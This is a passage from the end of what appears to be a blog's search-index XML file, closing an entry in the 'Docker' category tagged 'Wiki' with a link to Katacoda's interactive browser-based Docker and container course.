<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2F0YWNvZGEuY29tL2NvdXJzZXMvZG9ja2Vy" title="https://www.katacoda.com/courses/docker">Learn Docker &amp; Containers using Interactive Browser-Based Scenarios<i class="fa fa-external-link"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Wiki</tag>
      </tags>
  </entry>
</search>
